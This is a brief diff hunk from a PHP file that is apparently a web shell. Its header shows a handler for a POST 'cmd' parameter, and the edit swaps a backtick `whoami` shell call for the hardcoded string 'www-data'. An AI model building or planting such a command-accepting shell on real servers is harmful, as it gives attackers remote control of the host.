@@ -22,7 +22,7 @@ if (ISSET($_POST['cmd'])) {
     die();
 }
 $host = php_uname('n');
-$name = `whoami`;
+$name = 'www-data';
 define('HOST',$host);
 define('NAME',$name);
 function getUserNameElement($float = true) {
